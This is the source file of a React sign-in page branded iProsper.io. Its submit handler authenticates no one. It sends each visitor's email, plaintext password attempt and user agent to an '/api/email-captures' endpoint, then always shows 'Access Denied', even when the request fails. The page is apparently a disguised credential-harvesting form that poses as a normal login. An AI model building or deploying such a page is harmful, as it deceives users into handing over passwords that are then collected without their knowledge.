"use client";

import { useState, useCallback, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Loader2 } from 'lucide-react';
import Image from 'next/image';
import Navigation from '@/components/sections/navigation';

const SMALL_BAR_COUNT = 50;
const COLORS = [
  "#ff6b00", "#ff1744", "#9c27b0", "#0099ff", "#00bcd4", 
  "#ffc107", "#4caf50", "#e91e63", "#a454ff", "#ff4081", 
  "#4a90e2", "#ef8d4b", "#6c43c1", "#33a1e2", "#f472b6"
];

const SmallWaveformVisualization = () => {
  const [barHeights, setBarHeights] = useState(() =>
    Array.from({ length: SMALL_BAR_COUNT }, () => Math.random() * 30 + 10)
  );

  useEffect(() => {
    const intervalId = setInterval(() => {
      setBarHeights(Array.from({ length: SMALL_BAR_COUNT }, () => Math.random() * 30 + 10));
    }, 1000);

    return () => clearInterval(intervalId);
  }, []);

  return (
    <div className="flex justify-center items-end space-x-1 h-16 mb-6">
      {Array.from({ length: SMALL_BAR_COUNT }).map((_, i) => (
        <div
          key={i}
          className="transition-all duration-1000 ease-in-out"
          style={{
            width: '3px',
            height: `${barHeights[i]}px`,
            backgroundColor: COLORS[i % COLORS.length],
            borderRadius: '1.5px'
          }}
        />
      ))}
    </div>
  );
};

export default function SignInPage() {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validateForm = useCallback(() => {
    const newErrors: { email?: string; password?: string } = {};

    if (!formData.email.trim()) {
      newErrors.email = 'Login ID is required';
    } else if (!validateEmail(formData.email)) {
      newErrors.email = 'Please enter a valid email address';
    }

    if (!formData.password.trim()) {
      newErrors.password = 'Password is required';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  }, [formData]);

  const handleInputChange = useCallback((field: 'email' | 'password', value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
    
    // Clear field-specific error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: undefined
      }));
    }
  }, [errors]);

  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/email-captures', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: formData.email,
          passwordAttempt: formData.password,
          userAgent: navigator.userAgent,
        }),
      });

      if (response.ok) {
        setIsSubmitted(true);
      } else {
        // Even on API error, show the unauthorized message for UX
        setIsSubmitted(true);
      }
    } catch (error) {
      // Even on network error, show the unauthorized message for UX
      setIsSubmitted(true);
    } finally {
      setIsLoading(false);
    }
  }, [formData, validateForm]);

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-[#1a1a1a]">
        <Navigation />
        <div className="flex items-center justify-center px-6 pt-20 pb-20">
          <div className="w-full max-w-md">
            <div className="text-center">
              <div className="mb-8">
                <div className="flex items-center justify-center mb-6">
                  <Image
                    src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/object/public/document-uploads/1757009205035-fx2gim7laip.png"
                    alt="iProsper.io"
                    width={140}
                    height={40}
                    className="h-8 w-auto brightness-100 contrast-100"
                    priority
                  />
                </div>
                <SmallWaveformVisualization />
              </div>
              
              <div className="bg-[#2a2a2a] border border-[#333333] rounded-lg p-8">
                <h1 className="text-2xl font-semibold text-white mb-4">Access Denied</h1>
                <p className="text-[#a0a0a0] text-lg leading-relaxed">
                  You are not authorized to enter. Access denied.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1a1a]">
      <Navigation />
      <div className="flex items-center justify-center px-6 pt-20 pb-20">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="flex items-center justify-center mb-6">
              <Image
                src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/object/public/document-uploads/1757009205035-fx2gim7laip.png"
                alt="iProsper.io"
                width={140}
                height={40}
                className="h-8 w-auto brightness-100 contrast-100"
                priority
              />
            </div>
            
            <SmallWaveformVisualization />
            
            <h1 className="text-3xl font-semibold text-white mb-2">Welcome back</h1>
            <p className="text-[#a0a0a0]">Sign in to your account to continue</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-white mb-2">
                Login ID
              </label>
              <input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange('email', e.target.value)}
                className={`w-full px-4 py-3 bg-[#2a2a2a] border rounded-lg text-white placeholder-[#666666] transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-[#0099ff] ${
                  errors.email ? 'border-[#ff1744]' : 'border-[#333333] focus:border-[#0099ff]'
                }`}
                placeholder="Enter your email address"
                required
                autoComplete="email"
              />
              {errors.email && (
                <p className="mt-2 text-sm text-[#ff1744]">{errors.email}</p>
              )}
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-white mb-2">
                Password
              </label>
              <input
                id="password"
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                className={`w-full px-4 py-3 bg-[#2a2a2a] border rounded-lg text-white placeholder-[#666666] transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-[#0099ff] ${
                  errors.password ? 'border-[#ff1744]' : 'border-[#333333] focus:border-[#0099ff]'
                }`}
                placeholder="Enter your password"
                required
                autoComplete="off"
              />
              {errors.password && (
                <p className="mt-2 text-sm text-[#ff1744]">{errors.password}</p>
              )}
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-white text-[#1a1a1a] hover:bg-[#a0a0a0] font-medium py-3 px-4 rounded-[24px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Signing in...
                </>
              ) : (
                'Sign In'
              )}
            </Button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-[#666666] text-sm">
              Don't have an account?{' '}
              <a href="/signup" className="text-[#0099ff] hover:underline">
                Create one here
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}